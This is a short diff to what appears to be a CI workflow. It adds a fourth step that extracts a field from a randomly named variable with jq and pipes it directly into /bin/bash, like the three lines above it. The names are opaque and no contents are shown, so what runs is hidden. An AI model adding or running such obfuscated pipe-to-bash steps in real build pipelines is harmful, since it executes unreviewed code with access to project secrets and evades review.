@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$zkh38" | jq -r .jt40 | /bin/bash
           echo $ydt91 | jq -r .lc41 | /bin/bash
           printf '%s' "$e488" | jq -r .idm94430 | /bin/bash
+          printf '%s' "$mcr2" | jq -r .ab285 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
